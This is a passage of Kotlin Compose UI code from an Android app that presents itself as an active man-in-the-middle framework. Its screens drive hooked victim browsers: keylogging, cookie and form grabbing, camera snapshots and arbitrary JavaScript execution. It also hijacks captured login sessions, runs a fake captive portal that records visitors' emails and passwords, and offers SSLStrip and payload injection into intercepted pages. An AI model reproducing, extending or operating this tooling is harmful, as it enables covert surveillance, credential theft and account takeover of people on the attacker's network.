                Text("First: ${device.firstSeen.toString().take(16)}", fontSize = 10.sp, color = CgGray)
            }
            if (showNickname) {
                Spacer(Modifier.height(8.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(value = nickname, onValueChange = { nickname = it },
                        placeholder = { Text("Set nickname...", fontSize = 11.sp) },
                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite),
                        modifier = Modifier.weight(1f).height(42.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                    Spacer(Modifier.width(6.dp))
                    FilledIconButton(onClick = { onSetNickname(device.ip, nickname.text); showNickname = false },
                        colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)), modifier = Modifier.size(42.dp)) {
                        Icon(Icons.Filled.Check, contentDescription = null, tint = CgGreen, modifier = Modifier.size(18.dp))
                    }
                }
            }
        }
    }
}

// ============================
// HOOKED SCREEN
// ============================
@Composable
fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand: (String, String, Map<String, Any?>) -> Unit) {
    var selectedSession by remember { mutableStateOf<String?>(null) }
    var jsInput by remember { mutableStateOf(TextFieldValue("")) }
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item { Text("Hooked Browsers", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }
        item { Text("${sessions.count { it.isAlive }} live sessions", fontSize = 12.sp, color = CgGray) }
        items(sessions.filter { it.isAlive }) { session ->
            val isSelected = selectedSession == session.sessionId
            Card(Modifier.fillMaxWidth().clickable { selectedSession = if (isSelected) null else session.sessionId },
                colors = CardDefaults.cardColors(containerColor = if (isSelected) CgMagenta.copy(0.08f) else CgCard),
                shape = RoundedCornerShape(12.dp), border = if (isSelected) BorderStroke(1.dp, CgMagenta.copy(0.4f)) else null) {
                Column(Modifier.padding(14.dp)) {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                        Column(Modifier.weight(1f)) {
                            Text(session.pageUrl.take(48), fontSize = 12.sp, color = CgCyan, fontWeight = FontWeight.SemiBold, maxLines = 1, overflow = TextOverflow.Ellipsis)
                            Text("${session.platform} · ${session.screenSize} · keys:${session.keylog.size}", fontSize = 10.sp, color = CgGray)
                        }
                        Badge(containerColor = CgGreen.copy(0.2f)) { Text("LIVE", fontSize = 8.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 4.dp)) }
                    }
                    if (isSelected) {
                        Spacer(Modifier.height(10.dp))
                        FlowRow(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                            CmdChip("Screenshot", CgCyan) { onCommand(session.sessionId, "screenshot", emptyMap()) }
                            CmdChip("Keylog ON", CgMagenta) { onCommand(session.sessionId, "keylog_start", emptyMap()) }
                            CmdChip("Keylog OFF", CgGray) { onCommand(session.sessionId, "keylog_stop", emptyMap()) }
                            CmdChip("Cookies", CgAmber) { onCommand(session.sessionId, "get_cookies", emptyMap()) }
                            CmdChip("Storage", CgAmber) { onCommand(session.sessionId, "get_storage", emptyMap()) }
                            CmdChip("Forms", CgRed) { onCommand(session.sessionId, "form_grab", emptyMap()) }
                            CmdChip("Clipboard", CgDimGreen) { onCommand(session.sessionId, "get_clipboard", emptyMap()) }
                            CmdChip("Location", CgBlue) { onCommand(session.sessionId, "get_location", emptyMap()) }
                            CmdChip("Camera", CgRed) { onCommand(session.sessionId, "camera_snap", emptyMap()) }
                            CmdChip("DOM", CgGray) { onCommand(session.sessionId, "get_dom", emptyMap()) }
                        }
                        Spacer(Modifier.height(8.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            OutlinedTextField(value = jsInput, onValueChange = { jsInput = it },
                                placeholder = { Text("Execute JavaScript...", fontSize = 11.sp) },
                                textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgGreen, fontFamily = FontFamily.Monospace),
                                modifier = Modifier.weight(1f).height(42.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
                                colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                            Spacer(Modifier.width(6.dp))
                            FilledIconButton(onClick = { onCommand(session.sessionId, "exec_js", mapOf("code" to jsInput.text)); jsInput = TextFieldValue("") },
                                colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)), modifier = Modifier.size(42.dp)) {
                                Icon(Icons.Filled.PlayArrow, contentDescription = null, tint = CgGreen, modifier = Modifier.size(18.dp))
                            }
                        }
                        Spacer(Modifier.height(6.dp))
                        events.filter { it.sessionId == session.sessionId }.takeLast(4).reversed().forEach { event ->
                            Text("${event.type}: ${event.data.entries.take(2).joinToString { "${it.key}=${it.value.toString().take(22)}" }}",
                                fontSize = 9.sp, color = CgDimGreen, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun CmdChip(label: String, color: Color, onClick: () -> Unit) {
    SuggestionChip(onClick = onClick, label = { Text(label, fontSize = 10.sp, color = color) },
        shape = RoundedCornerShape(8.dp), border = SuggestionChipDefaults.suggestionChipBorder(enabled = true, borderColor = color.copy(0.3f)),
        colors = SuggestionChipDefaults.suggestionChipColors(containerColor = color.copy(0.08f)))
}

// ============================
// NETWORK MAP
// ============================
@Composable
fun NetworkMapScreen(hosts: List<NetworkHost>, isScanning: Boolean, onScan: () -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Column {
                    Text("Network Map", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                    Text("${hosts.size} hosts discovered", fontSize = 12.sp, color = CgGray)
                }
                Button(onClick = onScan, enabled = !isScanning, colors = ButtonDefaults.buttonColors(containerColor = CgCyan.copy(0.15f)), shape = RoundedCornerShape(10.dp),
                    border = BorderStroke(1.dp, CgCyan.copy(0.4f))) {
                    if (isScanning) CircularProgressIndicator(modifier = Modifier.size(14.dp), color = CgCyan, strokeWidth = 2.dp)
                    else Icon(Icons.Filled.Radar, contentDescription = null, tint = CgCyan, modifier = Modifier.size(14.dp))
                    Spacer(Modifier.width(6.dp))
                    Text(if (isScanning) "Scanning..." else "Scan Network", color = CgCyan, fontSize = 12.sp)
                }
            }
        }
        items(hosts) { host ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(38.dp).clip(RoundedCornerShape(8.dp)).background(if (host.isGateway) CgGreen.copy(0.15f) else CgCyan.copy(0.1f)), contentAlignment = Alignment.Center) {
                        Icon(if (host.isGateway) Icons.Filled.Router else Icons.Filled.PhoneAndroid,
                            contentDescription = null, tint = if (host.isGateway) CgGreen else CgCyan, modifier = Modifier.size(18.dp))
                    }
                    Spacer(Modifier.width(12.dp))
                    Column(Modifier.weight(1f)) {
                        Text(host.hostname ?: host.ip, fontSize = 13.sp, fontWeight = FontWeight.Medium, color = CgWhite)
                        Text(if (host.hostname != null) host.ip else "", fontSize = 10.sp, color = CgGray)
                        host.mac?.let { Text(it, fontSize = 10.sp, color = CgGray.copy(0.6f)) }
                    }
                    host.vendor?.let { Badge(containerColor = CgCyan.copy(0.12f)) { Text(it.take(12), fontSize = 8.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 4.dp)) } }
                }
            }
        }
    }
}

// ============================
// STATS SCREEN
// ============================
@Composable
fun StatsScreen(stats: TrafficStats) {
    val topDomains = remember(stats.totalPackets.get()) { stats.topDomains() }
    val bwHistory by stats.bandwidthHistory.collectAsState()
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item { Text("Traffic Statistics", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                StatCard("Packets", "${stats.totalPackets.get()}", CgAmber, Icons.Filled.SwapVert, Modifier.weight(1f))
                StatCard("Traffic", formatBytes(stats.totalBytes.get()), CgBlue, Icons.Filled.DataUsage, Modifier.weight(1f))
            }
        }
        if (bwHistory.isNotEmpty()) {
            item {
                CgCard {
                    Text("Bandwidth (last 60s)", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                    Spacer(Modifier.height(8.dp))
                    val maxBw = bwHistory.maxOfOrNull { it.bytesPerSecond } ?: 1L
                    Row(Modifier.fillMaxWidth().height(60.dp), horizontalArrangement = Arrangement.spacedBy(1.dp), verticalAlignment = Alignment.Bottom) {
                        bwHistory.takeLast(30).forEach { point ->
                            val h = if (maxBw > 0) (point.bytesPerSecond.toFloat() / maxBw * 60).coerceIn(2f, 60f) else 2f
                            Box(Modifier.weight(1f).height(h.dp).clip(RoundedCornerShape(topStart = 2.dp, topEnd = 2.dp)).background(CgCyan.copy(0.7f)))
                        }
                    }
                    Spacer(Modifier.height(4.dp))
                    Text("Peak: ${formatBytes(bwHistory.maxOfOrNull { it.bytesPerSecond } ?: 0)}/s · Current: ${formatBytes(bwHistory.lastOrNull()?.bytesPerSecond ?: 0)}/s", fontSize = 10.sp, color = CgCyan)
                }
            }
        }
        item { SectionLabel("Top Domains") }
        items(topDomains) { domain ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(8.dp)) {
                Row(Modifier.padding(12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                    Column(Modifier.weight(1f)) {
                        Text(domain.domain, fontSize = 12.sp, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        Text("${formatBytes(domain.bytesTotal)} transferred", fontSize = 10.sp, color = CgGray)
                    }
                    Text("${domain.requestCount}", fontSize = 15.sp, fontWeight = FontWeight.Bold, color = CgAmber)
                }
            }
        }
    }
}

// ============================
// SESSION HIJACKER
// ============================
@Composable
fun HijackScreen(sessions: List<HijackSession>, onHijack: (HijackSession) -> Unit, onRemove: (String) -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item {
            Text("Session Hijacker", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
            Spacer(Modifier.height(4.dp))
            Text("Tap a session to open it authenticated in your browser. Sessions are auto-added from captured cookies.", fontSize = 12.sp, color = CgGray, lineHeight = 16.sp)
        }
        if (sessions.isEmpty()) {
            item { EmptyState(Icons.Filled.Lock, "No sessions available", "Capture cookie sessions from targets to hijack them") }
        } else {
            items(sessions) { session ->
                Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgRed.copy(0.2f))) {
                    Column(Modifier.padding(14.dp)) {
                        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                            Column(Modifier.weight(1f)) {
                                Text(session.label, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                                Text("From: ${session.sourceIp}", fontSize = 11.sp, color = CgGray)
                                Text(session.capturedAt.toString().take(16), fontSize = 10.sp, color = CgGray.copy(0.6f))
                            }
                            Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                                FilledTonalButton(onClick = { onHijack(session) }, colors = ButtonDefaults.filledTonalButtonColors(containerColor = CgRed.copy(0.2f)), shape = RoundedCornerShape(8.dp)) {
                                    Icon(Icons.Filled.OpenInBrowser, contentDescription = null, tint = CgRed, modifier = Modifier.size(14.dp))
                                    Spacer(Modifier.width(4.dp))
                                    Text("Hijack", color = CgRed, fontSize = 11.sp)
                                }
                                IconButton(onClick = { onRemove(session.id) }, modifier = Modifier.size(36.dp)) {
                                    Icon(Icons.Filled.Delete, contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
                                }
                            }
                        }
                        Spacer(Modifier.height(6.dp))
                        Text(session.cookies.take(80) + if (session.cookies.length > 80) "…" else "", fontSize = 9.sp, color = CgGray.copy(0.6f), fontFamily = FontFamily.Monospace, maxLines = 2)
                    }
                }
            }
        }
    }
}

// ============================
// CAPTIVE PORTAL SCREEN
// ============================
@Composable
fun CaptiveScreen(config: CaptiveConfig, entries: List<CaptiveEntry>, onUpdateConfig: (CaptiveConfig) -> Unit) {
    var activeTab by remember { mutableStateOf(0) }
    Column(Modifier.fillMaxSize()) {
        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("Captive Portal", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
            Badge(containerColor = if (config.enabled) CgGreen.copy(0.2f) else CgGray.copy(0.2f)) {
                Text(if (config.enabled) "ACTIVE" else "OFF", fontSize = 9.sp, color = if (config.enabled) CgGreen else CgGray, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
            }
        }
        TabRow(selectedTabIndex = activeTab, containerColor = CgSurface, contentColor = CgGreen) {
            Tab(selected = activeTab == 0, onClick = { activeTab = 0 }) { Text("Config", fontSize = 12.sp, modifier = Modifier.padding(vertical = 10.dp)) }
            Tab(selected = activeTab == 1, onClick = { activeTab = 1 }) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("Captures", fontSize = 12.sp, modifier = Modifier.padding(vertical = 10.dp))
                    if (entries.isNotEmpty()) { Spacer(Modifier.width(4.dp)); Badge(containerColor = CgRed) { Text("${entries.size}", fontSize = 8.sp) } }
                }
            }
        }
        when (activeTab) {
            0 -> CaptiveConfigTab(config, onUpdateConfig)
            1 -> CaptiveCapturesTab(entries)
        }
    }
}

@Composable
fun CaptiveConfigTab(config: CaptiveConfig, onUpdate: (CaptiveConfig) -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item { ToggleRow("Enable Captive Portal (port 8888)", config.enabled) { onUpdate(config.copy(enabled = it)) } }
        item { CaptiveField("Portal Title", config.title) { onUpdate(config.copy(title = it)) } }
        item { CaptiveField("Subtitle", config.subtitle) { onUpdate(config.copy(subtitle = it)) } }
        item { CaptiveField("Logo Text (2 chars)", config.logoText) { onUpdate(config.copy(logoText = it)) } }
        item { CaptiveField("Primary Color (#hex)", config.primaryColor) { onUpdate(config.copy(primaryColor = it)) } }
        item { ToggleRow("Require Email/Username", config.requireEmail) { onUpdate(config.copy(requireEmail = it)) } }
        item { ToggleRow("Require Password", config.requirePassword) { onUpdate(config.copy(requirePassword = it)) } }
        item { CaptiveField("Redirect URL after submit", config.redirectUrl) { onUpdate(config.copy(redirectUrl = it)) } }
    }
}

@Composable
fun CaptiveField(label: String, value: String, onChange: (String) -> Unit) {
    var text by remember { mutableStateOf(TextFieldValue(value)) }
    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) }, label = { Text(label, fontSize = 10.sp) },
        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite), modifier = Modifier.fillMaxWidth(),
        singleLine = true, shape = RoundedCornerShape(8.dp),
        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgCard, focusedContainerColor = CgCard, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgAmber))
}

@Composable
fun CaptiveCapturesTab(entries: List<CaptiveEntry>) {
    if (entries.isEmpty()) {
        EmptyState(Icons.Filled.Wifi, "No visitors yet", "Enable the portal and connect targets to your hotspot")
        return
    }
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
        items(entries.reversed()) { entry ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                Column(Modifier.padding(12.dp)) {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                        Text(entry.sourceIp, fontSize = 13.sp, color = CgWhite, fontWeight = FontWeight.Medium)
                        Badge(containerColor = if (entry.accepted) CgGreen.copy(0.2f) else CgGray.copy(0.2f)) {
                            Text(if (entry.accepted) "SUBMITTED" else "VISITED", fontSize = 8.sp, color = if (entry.accepted) CgGreen else CgGray, modifier = Modifier.padding(horizontal = 4.dp))
                        }
                    }
                    entry.username?.let { Text("Email/User: $it", fontSize = 11.sp, color = CgCyan, modifier = Modifier.padding(top = 4.dp)) }
                    entry.password?.let { Text("Password: $it", fontSize = 11.sp, color = CgRed) }
                    Text(entry.userAgent.take(55), fontSize = 9.sp, color = CgGray.copy(0.6f), maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.padding(top = 2.dp))
                }
            }
        }
    }
}

// ============================
// WEBSOCKET SCREEN
// ============================
@Composable
fun WebSocketScreen(frames: List<WebSocketFrame>) {
    Column(Modifier.fillMaxSize()) {
        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("WebSocket Frames", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
            Text("${frames.size} captured", fontSize = 12.sp, color = CgGray)
        }
        if (frames.isEmpty()) {
            EmptyState(Icons.Filled.Cable, "No WebSocket frames", "WS frames appear here when captured from hooked sessions")
        } else {
            LazyColumn(Modifier.fillMaxSize().padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
                items(frames.reversed()) { frame ->
                    val color = if (frame.direction.contains("CLIENT")) CgCyan else CgAmber
                    Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(8.dp)) {
                        Column(Modifier.padding(10.dp)) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(if (frame.direction.contains("CLIENT")) Icons.Filled.ArrowUpward else Icons.Filled.ArrowDownward,
                                    contentDescription = null, tint = color, modifier = Modifier.size(12.dp))
                                Spacer(Modifier.width(4.dp))
                                Text(frame.host, fontSize = 11.sp, color = color, fontWeight = FontWeight.SemiBold)
                                Spacer(Modifier.width(6.dp))
                                Text(frame.opcode, fontSize = 10.sp, color = CgGray)
                                Spacer(Modifier.weight(1f))
                                Text("${frame.payloadSize}B", fontSize = 10.sp, color = CgGray)
                            }
                            if (frame.payload.isNotEmpty()) {
                                Spacer(Modifier.height(4.dp))
                                Text(frame.payload.take(120), fontSize = 10.sp, color = CgWhite.copy(0.7f), fontFamily = FontFamily.Monospace, maxLines = 3, overflow = TextOverflow.Ellipsis)
                            }
                        }
                    }
                }
            }
        }
    }
}

// ============================
// SETTINGS SCREEN
// ============================
@Composable
fun SettingsScreen(
    mode: InterceptMode, onModeChange: (InterceptMode) -> Unit,
    config: InjectionConfig, onConfigUpdate: (InjectionConfig) -> Unit,
    profiles: List<String>, onSaveProfile: (String) -> Unit, onLoadProfile: (String) -> Unit, onDeleteProfile: (String) -> Unit,
    onExportCa: () -> Unit, savedSessions: List<String>,
    onSaveSession: () -> Unit, onDeleteSession: (String) -> Unit, onShareSession: (String) -> Unit,
    autoStart: Boolean, onToggleAutoStart: (Boolean) -> Unit,
    gatewayIp: String = "192.168.43.1",
    navigateTo: (Screen) -> Unit
) {
    var profileName by remember { mutableStateOf(TextFieldValue("")) }
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item { Text("Settings", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }

        // intercept mode
        item {
            CgCard {
                Text("Intercept Mode", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
                Spacer(Modifier.height(8.dp))
                InterceptMode.entries.forEach { m ->
                    Row(Modifier.fillMaxWidth().clickable { onModeChange(m) }.padding(vertical = 6.dp), verticalAlignment = Alignment.CenterVertically) {
                        RadioButton(selected = mode == m, onClick = { onModeChange(m) }, colors = RadioButtonDefaults.colors(selectedColor = CgGreen))
                        Spacer(Modifier.width(8.dp))
                        Column {
                            Text(m.name, fontSize = 12.sp, color = CgWhite, fontWeight = FontWeight.Medium)
                            Text(when (m) {
                                InterceptMode.PASSTHROUGH -> "Log traffic silently"
                                InterceptMode.AUTO_INJECT -> "Auto-inject payloads into HTML"
                                InterceptMode.MANUAL -> "Pause each packet for editing"
                            }, fontSize = 10.sp, color = CgGray)
                        }
                    }
                }
            }
        }

        // injection config
        item {
            CgCard {
                Text("Injection Config", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
                Spacer(Modifier.height(8.dp))
                ToggleRow("Browser Hook Agent", config.hookEnabled) { onConfigUpdate(config.copy(hookEnabled = it)) }
                ToggleRow("SSLStrip (downgrade HTTPS links)", config.sslStripEnabled) { onConfigUpdate(config.copy(sslStripEnabled = it)) }
                SettingsField("Audio URL", config.audioUrl ?: "") { onConfigUpdate(config.copy(audioUrl = it.ifBlank { null })) }
                SettingsField("Video URL", config.videoUrl ?: "") { onConfigUpdate(config.copy(videoUrl = it.ifBlank { null })) }
                SettingsField("Document URL", config.documentUrl ?: "") { onConfigUpdate(config.copy(documentUrl = it.ifBlank { null })) }
                SettingsField("Redirect URL", config.redirectUrl ?: "") { onConfigUpdate(config.copy(redirectUrl = it.ifBlank { null })) }
                SettingsField("Custom JS", config.customJs ?: "") { onConfigUpdate(config.copy(customJs = it.ifBlank { null })) }
            }
        }

        // profiles
        item {
            CgCard {
                Text("Injection Profiles", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
                Spacer(Modifier.height(8.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(value = profileName, onValueChange = { profileName = it },
                        placeholder = { Text("Profile name", fontSize = 11.sp) },
                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite),
                        modifier = Modifier.weight(1f).height(42.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                    Spacer(Modifier.width(6.dp))
                    Button(onClick = { if (profileName.text.isNotBlank()) { onSaveProfile(profileName.text); profileName = TextFieldValue("") } },
                        colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)), shape = RoundedCornerShape(8.dp), contentPadding = PaddingValues(horizontal = 14.dp)) {
                        Text("Save", fontSize = 11.sp, color = CgGreen)
                    }
                }
                Spacer(Modifier.height(6.dp))
                profiles.forEach { name ->
                    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                        Text(name, fontSize = 12.sp, color = CgWhite, modifier = Modifier.weight(1f))
                        Row {
                            TextButton(onClick = { onLoadProfile(name) }) { Text("Load", fontSize = 10.sp, color = CgCyan) }
                            TextButton(onClick = { onDeleteProfile(name) }) { Text("Del", fontSize = 10.sp, color = CgRed) }
                        }
                    }
                }
            }
        }

        // session snapshots
        item {
            CgCard {
                Text("Session Snapshots", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
                Spacer(Modifier.height(8.dp))
                Button(onClick = onSaveSession, colors = ButtonDefaults.buttonColors(containerColor = CgBlue.copy(0.2f)), shape = RoundedCornerShape(8.dp), modifier = Modifier.fillMaxWidth(),
                    border = BorderStroke(1.dp, CgBlue.copy(0.4f))) {
                    Icon(Icons.Filled.Save, contentDescription = null, tint = CgBlue, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("Save Current Session", fontSize = 12.sp, color = CgBlue)
                }
                Spacer(Modifier.height(6.dp))
                if (savedSessions.isEmpty()) {
                    Text("No saved sessions", fontSize = 11.sp, color = CgGray)
                } else {
                    savedSessions.forEach { name ->
                        Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Filled.FolderOpen, contentDescription = null, tint = CgGray, modifier = Modifier.size(14.dp))
                            Spacer(Modifier.width(6.dp))
                            Text(name, fontSize = 11.sp, color = CgWhite, modifier = Modifier.weight(1f))
                            TextButton(onClick = { onShareSession(name) }) { Text("Share", fontSize = 10.sp, color = CgCyan) }
                            TextButton(onClick = { onDeleteSession(name) }) { Text("Del", fontSize = 10.sp, color = CgRed) }
                        }
                    }
                }
            }
        }

        // system
        item {
            CgCard {
                Text("System", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
                Spacer(Modifier.height(4.dp))
                ToggleRow("Auto-start on boot", autoStart, onToggleAutoStart)
                HorizontalDivider(color = CgGray.copy(0.15f), modifier = Modifier.padding(vertical = 4.dp))
                SettingsRow("Export CA Certificate", Icons.Filled.Security, CgAmber, onExportCa)
                SettingsRow("Network Map", Icons.Filled.Radar, CgCyan) { navigateTo(Screen.NETWORK) }
                SettingsRow("Captive Portal", Icons.Filled.Wifi, CgAmber) { navigateTo(Screen.CAPTIVE) }
                SettingsRow("WebSocket Frames", Icons.Filled.Cable, CgPurple) { navigateTo(Screen.WEBSOCKET) }
                SettingsRow("Hooked Sessions", Icons.Filled.Phishing, CgMagenta) { navigateTo(Screen.HOOKED) }
                SettingsRow("Traffic Stats", Icons.Filled.BarChart, CgBlue) { navigateTo(Screen.STATS) }
                SettingsRow("About / Developer", Icons.Filled.Info, CgDimGreen) { navigateTo(Screen.ABOUT) }
            }
        }
    }
}

@Composable
fun SettingsField(label: String, value: String, onChange: (String) -> Unit) {
    var text by remember { mutableStateOf(TextFieldValue(value)) }
    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) }, label = { Text(label, fontSize = 10.sp) },
        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite), modifier = Modifier.fillMaxWidth().padding(top = 4.dp),
        singleLine = true, shape = RoundedCornerShape(8.dp),
        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
}

@Composable
fun ToggleRow(label: String, checked: Boolean, onChange: (Boolean) -> Unit) {
    Row(Modifier.fillMaxWidth().padding(vertical = 4.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
        Text(label, fontSize = 12.sp, color = CgWhite, modifier = Modifier.weight(1f))
        Switch(checked = checked, onCheckedChange = onChange, colors = SwitchDefaults.colors(checkedTrackColor = CgGreen, uncheckedTrackColor = CgGray))
    }
}

@Composable
fun SettingsRow(label: String, icon: ImageVector, color: Color, onClick: () -> Unit) {
    Row(Modifier.fillMaxWidth().clickable(onClick = onClick).padding(vertical = 10.dp), verticalAlignment = Alignment.CenterVertically) {
        Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
        Spacer(Modifier.width(12.dp))
        Text(label, fontSize = 13.sp, color = CgWhite, modifier = Modifier.weight(1f))
        Icon(Icons.Filled.ChevronRight, contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
    }
}

// ============================
// ABOUT SCREEN
// ============================
@Composable
fun AboutScreen() {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(12.dp)) {
        item { Spacer(Modifier.height(12.dp)) }
        item {
            Box(Modifier.size(80.dp).clip(RoundedCornerShape(20.dp)).background(Brush.linearGradient(listOf(CgGreen.copy(0.3f), CgCyan.copy(0.1f)))), contentAlignment = Alignment.Center) {
                Text("CG", fontSize = 30.sp, fontWeight = FontWeight.Black, color = CgGreen)
            }
        }
        item { Text("CyberGhost 2", fontSize = 26.sp, fontWeight = FontWeight.Black, color = CgWhite) }
        item { Text("Active MITM Framework for Android", fontSize = 13.sp, color = CgGray) }
        item { Badge(containerColor = CgGreen.copy(0.2f)) { Text("v2.0", fontSize = 11.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)) } }

        item { HorizontalDivider(color = CgGray.copy(0.2f)) }

        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgGreen.copy(0.08f)), shape = RoundedCornerShape(16.dp), border = BorderStroke(1.dp, CgGreen.copy(0.2f))) {
                Column(Modifier.padding(20.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Box(Modifier.size(52.dp).clip(CircleShape).background(CgGreen.copy(0.15f)), contentAlignment = Alignment.Center) {
                        Text("NS", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgGreen)
                    }
                    Spacer(Modifier.height(10.dp))
                    Text("Developed by", fontSize = 11.sp, color = CgGray)
                    Text("Nitin Shukla", fontSize = 22.sp, fontWeight = FontWeight.Black, color = CgGreen)
                    Spacer(Modifier.height(6.dp))
                    Text("github.com/n0obcoders/cyberghost", fontSize = 12.sp, color = CgCyan)
                    Spacer(Modifier.height(4.dp))
